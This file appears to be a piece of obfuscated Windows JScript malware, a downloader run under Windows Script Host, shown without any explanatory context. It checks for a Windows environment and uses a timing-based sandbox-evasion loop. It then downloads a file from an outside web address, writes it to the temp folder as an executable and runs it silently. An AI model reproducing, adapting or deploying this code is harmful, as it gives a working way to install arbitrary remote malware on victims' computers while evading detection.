var _X0 = false;
var _AP = "CreateObject";
var _P = function _G() {return WScript[_AP]("WScript"+".Shell");}(), _S0 = 11;
var _Z = "MSXML2.XMLHTTP";
var _JU = 2123213;
var _EI = 0;
function _Q(_K0){_P["Run"](_K0, _EI, _EI);};
function _V(){return _Z + "";};
function _T(_WK, _RE){_EI = _EI * 1; return _WK - _RE;};
function _DV(){return _AP;};
/*@cc_on
  @if (@_win32 || @_win64)
    _X0 = true;
  @end
@*/
if (_X0)
{
var _K = "";
function _F(){return 22;};
var _VP = 0; var _Z0 = 0;
function _WX()
{
var _J = new this["Date"]();
var _M = _J["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _J = new this["Date"]();
var _I = _J["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _J = new this["Date"]();
var _PT = _J["getUTCMilliseconds"]();
var _VP = "_KN";
_VP = _T(_I, _M);
var _Z0 = "_TN";
_Z0 = _T(_PT, _I);
_K = "open";
return _T(_VP, _Z0);
}
var _WQ = false;
var _K1 = false;
for (var _D = _EI; _D < _F() * 1; _D++){if (_WX() != _EI){
_WQ = true; 
_Z0 = "31" + 11 * _VP + _Z0; 
_K1 = true; 
break;
}}
function _S() {return ((_WQ == true) && (_WQ == _K1)) ? 1 : _EI;};
if (_WQ && _S() && _K1){
function _IF() {return _P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "y9R6db6DrHjemy.ex" + "e";};
 _MA = _V();
 _L = WScript[_AP](_MA);
 var _UU = 1;
 while (_UU){
try {
	if (_UU == 1)
	{
		_L[_K]("GET", "http://sterdicustom.com/w3iks", false);
		_L["send"]();
		_I0 = "Sleep";
	}
	WScript[_I0](_F() + 120); 
	if (_L["readystate"] < 2 * 2) continue;
	_UU = _EI;
	function _PK(_W) {var _X = (1, 2, 3, 4, 5, _W); return _X;};
	_XC = WScript[_DV()]("ADODB.Stream");
	_MA = _XC;
	_MA[_K]();
	_MA["type"] = _PK(1);
	_MA["write"](_L["ResponseBody"]);
	_XC["position"] = _PK(_EI);
	_MA["Save" + "ToFile"](_IF(), 2);
	_XC["cl"+"ose"]();
	_G0 = _IF();
	_Q(_G0);
} catch(_T0){};
}
}
}

